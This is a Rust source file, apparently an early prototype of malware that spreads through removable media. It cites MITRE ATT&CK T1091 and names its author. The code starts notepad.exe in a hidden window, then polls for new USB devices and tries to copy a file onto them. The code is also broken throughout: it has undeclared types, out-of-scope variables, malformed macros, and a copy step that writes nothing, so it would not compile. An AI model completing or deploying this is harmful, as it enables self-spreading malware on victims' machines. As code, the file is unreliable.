use std::process::{Command, Stdio};
use std::os::windows::process::CommandExt;
use winapi::um::winbase::CREATE_NO_WINDOW;
use libusb::{self, DeviceList};
use std::fs::File;
use std::env;


fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() != 1{
        eprintln("[-] err: too many args");
        eprintln("[*] example : {} C:\\Windows\\System32\\filename.exe")
    }

    eprintln!("[*] removable media replication att&ck id: T1091");
    eprintln!("[*] written by peroxidee / iluvwerewolves ");
    
    processHandler();
        
}

fn duplicate(device: &Device) -> Result<(), Error>{
    if let Ok(handle) = device.open() {
       
        let mut f = File::open(args[0])?;
        let mut fc = f.try_clone()?;
        
    }
    Ok(())
}

fn getinfo(device: &Device) -> Result<(), Error>{
    if let Ok(handle) = device.open(){
        println!(device);    
    }

    Ok(())
}
fn monitor() -> Result<(), Error>{

    let lusb_context = Context::new()?;

    let prev = lusb_context.devices()?;
    
    loop { 

        let connected_usb_devices = lusb_context.devices()?;
        if connected_usb_devices.len() != prev.len(){  
            for device in connected_usb_devices.iter(){
                match getinfo(&device){
                    Ok(_) => duplicate(&device),
                    Err(e) => eprintln!("[-] err: {:?}", e)
                }  
            }
        }
        sleep(30);
    }

    Ok(())
    
}

fn processHandler() {
    let mut ntpd = Command::new("C:\\Windows\\System32\\notepad.exe");
    
    match start(&ntpd){
        Ok()=> (),
        Err(e) => eprintln("[-] err: {:?}", e),
    }
}

fn start(cmd: &Command) -> Result<(), std::io::Error>{
    cmd.creation_flags(CREATE_NO_WINDOW)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .stdin(Stdio::null());
    


    if let Ok(mut child) = cmd.spawn(){
        


        child.wait()?;
    
        monitor();
        Ok(())
    }
    else{
        eprintln!("[-] err: process not started!");
    
    Error(())
    }
    
}
